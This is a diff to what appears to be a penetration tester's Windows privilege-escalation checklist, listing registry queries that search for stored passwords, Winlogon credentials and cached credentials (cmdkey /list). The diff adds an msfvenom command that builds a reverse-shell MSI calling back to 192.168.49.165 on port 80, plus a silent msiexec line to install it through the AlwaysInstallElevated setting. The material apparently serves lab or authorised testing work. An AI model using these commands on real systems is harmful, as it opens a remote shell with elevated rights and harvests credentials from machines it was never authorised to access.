@@ -46,14 +46,16 @@ functions:
         - [ ] reg query HKLM /f pass /t REG_SZ /s | findstr "CurrentPass"
         - [ ] reg query HKLM /f password /t REG_SZ /s
         - [ ] reg query HKCU /f password /t REG_SZ /s
-        - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-        - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
         - [ ] reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
         - [ ] get-process | select name, path, starttime, ID | ?{$_.Path -like '*appdata*'} | fl
         - [ ] ./accesschk64.exe -accepteula -c Apache2.4 -l   # service control permission check
         - [ ] mountvol
         - [ ] netsh interface ipv4 show excludedportrange protocol=tcp
         - [ ] cmdkey /list
+        - [ ] reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+        - [ ] reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+                --> msfvenom -p windows/shell_reverse_tcp lhost=192.168.49.165 LPORT=80 -f msi -o shell.msi
+                    msiexec /quiet /qn /i shell.msi
         - [ ] Are non-standard apps storing configs in appdata?
 
     - description: Search for common credential locations
